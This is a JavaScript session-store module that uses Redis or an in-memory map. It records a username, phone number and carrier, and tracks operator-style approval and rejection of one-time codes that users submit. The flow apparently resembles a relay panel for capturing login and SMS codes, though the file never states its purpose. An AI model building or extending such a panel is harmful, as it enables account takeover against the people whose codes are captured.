import { Redis } from "@upstash/redis";

const SESSION_TTL = 60 * 60;
const memoryStore = globalThis.__sessionStore ?? new Map();
globalThis.__sessionStore = memoryStore;

function getRedis() {
  const url = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;

  if (!url || !token) return null;

  return new Redis({ url, token });
}

async function getSession(sessionId) {
  if (!sessionId || typeof sessionId !== "string") return null;

  const redis = getRedis();

  if (redis) {
    return redis.get(`session:${sessionId}`);
  }

  return memoryStore.get(sessionId) ?? null;
}

async function saveSession(sessionId, session) {
  const redis = getRedis();

  if (redis) {
    await redis.set(`session:${sessionId}`, session, { ex: SESSION_TTL });
  } else {
    memoryStore.set(sessionId, session);
    setTimeout(() => memoryStore.delete(sessionId), SESSION_TTL * 1000);
  }
}

export async function createSession(data) {
  const sessionId = crypto.randomUUID();
  const session = {
    status: "pending",
    username: data.username,
    phone: data.phone,
    carrier: data.carrier,
    createdAt: Date.now(),
  };

  await saveSession(sessionId, session);
  return sessionId;
}

export async function getSessionStatus(sessionId) {
  const session = await getSession(sessionId);
  if (!session) return "not_found";
  return session.status;
}

export async function approveSession(sessionId) {
  const session = await getSession(sessionId);
  if (!session || session.status !== "pending") return false;

  session.status = "approved";
  await saveSession(sessionId, session);
  return true;
}

export async function submitCode(sessionId, code) {
  const session = await getSession(sessionId);
  if (!session || (session.status !== "approved" && session.status !== "code_rejected")) {
    return false;
  }

  session.status = "code_pending";
  session.currentCode = code;
  await saveSession(sessionId, session);
  return session;
}

export async function approveCode(sessionId) {
  const session = await getSession(sessionId);
  if (!session || session.status !== "code_pending") return false;

  session.status = "code_approved";
  await saveSession(sessionId, session);
  return true;
}

export async function rejectCode(sessionId) {
  const session = await getSession(sessionId);
  if (!session || session.status !== "code_pending") return false;

  session.status = "code_rejected";
  await saveSession(sessionId, session);
  return true;
}

export async function requestResendCode(sessionId) {
  const session = await getSession(sessionId);
  if (!session) return null;

  session.status = "pending";
  session.currentCode = null;
  await saveSession(sessionId, session);
  return session;
}

export async function getSessionData(sessionId) {
  return getSession(sessionId);
}
